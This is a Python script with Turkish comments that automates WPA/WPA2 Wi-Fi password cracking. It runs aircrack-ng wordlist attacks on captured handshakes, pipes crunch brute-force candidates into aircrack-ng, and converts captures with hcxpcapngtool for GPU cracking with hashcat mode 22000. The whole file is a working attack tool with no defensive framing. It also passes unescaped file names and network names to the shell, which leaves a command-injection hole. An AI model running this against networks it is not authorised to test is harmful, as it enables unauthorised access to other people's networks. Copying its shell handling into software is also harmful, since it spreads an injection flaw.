import subprocess
import os
import time

def wordlist_attack(cap_file, wordlist):
    print(f"\n    [*] Şifre kırma motoru başlatılıyor (CPU - Aircrack)...")
    cmd = f"sudo aircrack-ng {cap_file} -w {wordlist}"
    try:
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n    [!] Kırma işlemi iptal edildi.")

def brute_force(cap_file, essid, charset="0123456789", length=8):
    print(f"\n    [*] Smart Brute başlatılıyor... (Şablon: {length} hane | Karakter: {charset})")
    cmd = f"crunch {length} {length} {charset} | sudo aircrack-ng {cap_file} -e {essid} -w -"
    try:
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n    [!] Kırma işlemi iptal edildi.")

# ==========================================
# YENİ: GPU GÜCÜ (HASHCAT ENTEGRASYONU)
# ==========================================
def hashcat_attack(cap_file, wordlist):
    print(f"\n    [*] Hashcat (GPU) Kırma Motoru Hazırlanıyor...")
    
    # .cap dosyasının ismini alıp Hashcat formatına uygun isim üretiyoruz
    base_name = cap_file.replace('.cap', '')
    hc_file = f"{base_name}.hc22000"
    
    print(f"    [*] Dosya Hashcat formatına (.hc22000) dönüştürülüyor...")
    # hcxpcapngtool aracı hcxtools paketinden gelir ve çeviri yapar
    conv_cmd = f"hcxpcapngtool -o {hc_file} {cap_file} > /dev/null 2>&1"
    subprocess.run(conv_cmd, shell=True)
    
    # Dosya oluştu mu diye kontrol ediyoruz
    if not os.path.exists(hc_file) or os.path.getsize(hc_file) == 0:
        print("    [✘] Dönüştürme başarısız! Handshake eksik veya 'hcxtools' paketi yüklü değil.")
        print("    [!] (Linux terminalinde şunu çalıştırın: sudo apt install hcxtools hashcat)")
        return
        
    print(f"    [✔] Dönüştürme başarılı. Ekran kartı (GPU) ateşleniyor...\n")
    time.sleep(1)
    
    # Hashcat'i çalıştır (Mod 22000 = WPA/WPA2/WPA3 formatı)
    cmd = f"hashcat -m 22000 {hc_file} {wordlist}"
    try:
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n    [!] Kırma işlemi manuel iptal edildi.")